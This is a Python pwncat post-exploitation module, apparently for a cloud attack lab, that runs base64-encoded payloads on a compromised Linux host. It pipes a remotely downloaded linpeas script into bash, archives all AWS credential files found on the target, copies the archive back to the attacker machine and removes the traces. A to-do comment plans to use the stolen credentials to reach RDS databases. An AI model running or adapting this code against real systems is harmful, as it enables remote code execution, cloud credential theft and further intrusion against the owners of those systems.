#!/usr/bin/env python3
from io import StringIO
import os 
import time
from pwncat import util
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pathlib import Path
import base64


class Module(BaseModule):
    """ Sample custom module """

    """
    Usage: run sample 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    def run(self, session: Session):
        yield Status( "preparing to pwn the [red]world[/red]")
        hostname = session.platform.getenv('HOSTNAME')
        session.log(f'hostname: {hostname}')
        script_dir = os.path.dirname(os.path.realpath(__file__))
        session.log(f"script dir: {script_dir}")
        task_name = session.platform.getenv("TASK")
        session.log(f"task environment: {task_name}")
        if task_name == "instance2rds":
            session.log(f"reading payload: {script_dir}/../resources/instance2rds.sh")
            try:
                payload = base64.b64encode(Path(f'{script_dir}/../resources/instance2rds.sh').read_bytes())
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instance2rds | base64 -d | /bin/bash &'")
                session.log(result)
            except Exception as e:
                session.log(f"error: {e}")
        elif task_name == "iam2rds":
            try:
                # run host enumeration
                payload = base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
                session.log(result)

                # remove any pre-existing cred archived
                if session.platform.Path('/tmp/aws_creds.tgz').exists():
                    session.platform.unlink('/tmp/aws_creds.tgz')

                # create an archive of all creds
                payload = base64.b64encode(b"tar -czvf /tmp/aws_creds.tgz -C / $(find / -name 'c*' -path '*.aws/c*' -type f -printf '%P\n' )")
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'")
                session.log(result)
                
                # cleanup any existing local cred archives for this host
                if Path(f'/tmp/{hostname}_aws_creds.tgz').exists():
                    os.unlink(f'/tmp/{hostname}_aws_creds.tgz')
                
                # transfer files from target to attacker
                with session.platform.open('/tmp/aws_creds.tgz', 'rb') as f1:
                    with open(f'/tmp/{hostname}_aws_creds.tgz','wb') as f2:
                        f2.write(f1.read())

                # remove temporary archive from target
                if session.platform.Path('/tmp/aws_creds.tgz').exists():
                    session.platform.unlink('/tmp/aws_creds.tgz')
                
                ### to do ###
                # 
                # 1. extract the creds for each host
                # 2. move the .aws folder to ~/.aws
                # 3. run the iam2rds.sh script
                #

            except Exception as e:
                session.log(f"error: {e}")
        else:
            result = session.platform.run("${default_payload}")
            session.log(result)

        session.log( f"ran {self.name}")